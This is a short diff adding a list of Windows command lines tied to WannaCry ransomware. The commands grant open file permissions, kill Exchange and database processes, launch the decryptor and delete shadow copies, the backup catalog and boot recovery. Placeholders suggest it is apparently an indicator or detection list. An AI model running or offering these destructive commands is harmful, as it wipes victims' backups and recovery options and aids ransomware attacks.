@@ -1,0 +1,12 @@
+icacls . /grant Everyone:F /T /C /Q
+attrib +h +s <Drive_Letter>:\$RECYCLE
+taskkill.exe /f /im Microsoft.Exchange.\*
+taskkill.exe /f /im MSExchange\*
+taskkill.exe /f /im sqlserver.exe
+taskkill.exe /f /im sqlwriter.exe
+taskkill.exe /f /im mysqld.exe
+cmd.exe /c start /b @WanaDecryptor@.exe vs
+cmd.exe /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -q
+-m security
+cmd /c <15 digits>.bat
+cscript.exe //nologo <1 character>.vbs
